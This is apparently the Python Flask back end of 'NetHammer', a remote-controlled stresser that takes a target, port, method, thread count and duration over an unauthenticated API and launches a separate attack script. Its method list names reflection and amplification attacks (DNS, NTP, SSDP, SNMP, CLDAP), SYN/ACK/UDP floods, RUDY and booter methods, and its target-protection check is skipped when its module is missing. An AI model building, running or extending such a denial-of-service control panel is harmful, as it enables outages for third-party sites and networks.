#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NetHammer 服务器端
为GUI客户端提供API接口
"""

from flask import Flask, request, jsonify
import subprocess
import threading
import time
import os
import signal
from datetime import datetime

app = Flask(__name__)

class NetHammerServer:
    def __init__(self):
        self.current_test = None
        self.test_process = None
        self.test_status = {
            'running': False,
            'start_time': None,
            'config': None,
            'pid': None
        }
        
    def log(self, message):
        """服务器日志"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")

# 创建服务器实例
server = NetHammerServer()

@app.route('/status', methods=['GET'])
def get_status():
    """获取服务器状态"""
    return jsonify({
        'status': 'online',
        'message': 'NetHammer Server is running',
        'version': '2.1',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/start_test', methods=['POST'])
def start_test():
    """启动测试"""
    try:
        data = request.get_json()
        
        # 验证请求数据
        required_fields = ['target', 'port', 'method', 'threads', 'duration']
        for field in required_fields:
            if field not in data:
                return jsonify({'error': f'Missing field: {field}'}), 400
        
        # 检查是否已有测试在运行
        if server.test_status['running']:
            return jsonify({'error': 'Another test is already running'}), 409
        
        # 安全检查
        target = data['target']
        try:
            from whitelist_filter import WhitelistFilter
            filter_system = WhitelistFilter()
            is_protected, message = filter_system.check_target(target)
            
            if is_protected:
                server.log(f"🚫 安全检查失败: {message}")
                return jsonify({
                    'error': 'Target is protected',
                    'message': message
                }), 403
        except ImportError:
            server.log("⚠️ 白名单模块未找到，跳过安全检查")
        
        # 构建命令
        cmd = [
            'python3', 'quick_attack.py',
            str(data['target']),
            '-p', str(data['port']),
            '-m', str(data['method']),
            '-c', str(data['threads']),
            '-t', str(data['duration'])
        ]
        
        if data.get('high_performance', False):
            cmd.append('--high-performance')
        
        server.log(f"🚀 启动测试: {' '.join(cmd)}")
        
        # 启动测试进程
        server.test_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid  # 创建新的进程组
        )
        
        # 更新状态
        server.test_status = {
            'running': True,
            'start_time': datetime.now(),
            'config': data,
            'pid': server.test_process.pid
        }
        
        server.log(f"✅ 测试已启动，PID: {server.test_process.pid}")
        
        return jsonify({
            'success': True,
            'message': 'Test started successfully',
            'pid': server.test_process.pid,
            'config': data
        })
        
    except Exception as e:
        server.log(f"❌ 启动测试失败: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/stop_test', methods=['POST'])
def stop_test():
    """停止测试"""
    try:
        if not server.test_status['running']:
            return jsonify({'error': 'No test is running'}), 400
        
        if server.test_process:
            # 终止进程组
            try:
                os.killpg(os.getpgid(server.test_process.pid), signal.SIGTERM)
                server.log(f"🛑 测试进程已终止，PID: {server.test_process.pid}")
            except ProcessLookupError:
                server.log("⚠️ 进程已经结束")
            
            server.test_process = None
        
        # 重置状态
        server.test_status = {
            'running': False,
            'start_time': None,
            'config': None,
            'pid': None
        }
        
        return jsonify({
            'success': True,
            'message': 'Test stopped successfully'
        })
        
    except Exception as e:
        server.log(f"❌ 停止测试失败: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/test_status', methods=['GET'])
def get_test_status():
    """获取测试状态"""
    try:
        status = server.test_status.copy()
        
        if status['running'] and server.test_process:
            # 检查进程是否还在运行
            poll = server.test_process.poll()
            if poll is not None:
                # 进程已结束
                server.log(f"📋 测试进程已结束，返回码: {poll}")
                server.test_status['running'] = False
                status['running'] = False
                status['exit_code'] = poll
        
        # 计算运行时间
        if status['start_time']:
            if isinstance(status['start_time'], datetime):
                elapsed = (datetime.now() - status['start_time']).total_seconds()
                status['elapsed_time'] = int(elapsed)
                status['start_time'] = status['start_time'].isoformat()
        
        return jsonify(status)
        
    except Exception as e:
        server.log(f"❌ 获取状态失败: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/methods', methods=['GET'])
def get_methods():
    """获取可用的测试方法"""
    methods = {
        'latest': ['http2', 'cldap', 'coap'],
        'reflection': ['dns', 'ntp', 'ssdp', 'snmp', 'netbios'],
        'flood': ['syn', 'ack', 'udp', 'fin', 'rst', 'psh'],
        'application': ['http', 'rudy'],
        'advanced': ['arme', 'dominate', 'essyn', 'trigemini', 'vse'],
        'combo': ['multi', 'combo']
    }
    
    return jsonify({
        'methods': methods,
        'total': sum(len(v) for v in methods.values())
    })

@app.route('/logs', methods=['GET'])
def get_logs():
    """获取测试日志"""
    try:
        if server.test_process and server.test_status['running']:
            # 读取进程输出
            stdout, stderr = server.test_process.communicate(timeout=1)
            return jsonify({
                'stdout': stdout.decode('utf-8', errors='ignore'),
                'stderr': stderr.decode('utf-8', errors='ignore')
            })
        else:
            return jsonify({
                'stdout': '',
                'stderr': '',
                'message': 'No active test'
            })
    except subprocess.TimeoutExpired:
        return jsonify({
            'stdout': '',
            'stderr': '',
            'message': 'Process still running'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

def cleanup_on_exit():
    """退出时清理"""
    if server.test_process:
        try:
            os.killpg(os.getpgid(server.test_process.pid), signal.SIGTERM)
            server.log("🧹 清理测试进程")
        except:
            pass

def main():
    """主函数"""
    import atexit
    atexit.register(cleanup_on_exit)
    
    server.log("🚀 NetHammer Server 启动中...")
    server.log("📡 API端点:")
    server.log("   GET  /status       - 服务器状态")
    server.log("   POST /start_test   - 启动测试")
    server.log("   POST /stop_test    - 停止测试")
    server.log("   GET  /test_status  - 测试状态")
    server.log("   GET  /methods      - 可用方法")
    server.log("   GET  /logs         - 测试日志")
    
    try:
        app.run(
            host='0.0.0.0',
            port=8080,
            debug=False,
            threaded=True
        )
    except KeyboardInterrupt:
        server.log("🛑 服务器被用户中断")
    except Exception as e:
        server.log(f"❌ 服务器启动失败: {str(e)}")

if __name__ == "__main__":
    main()
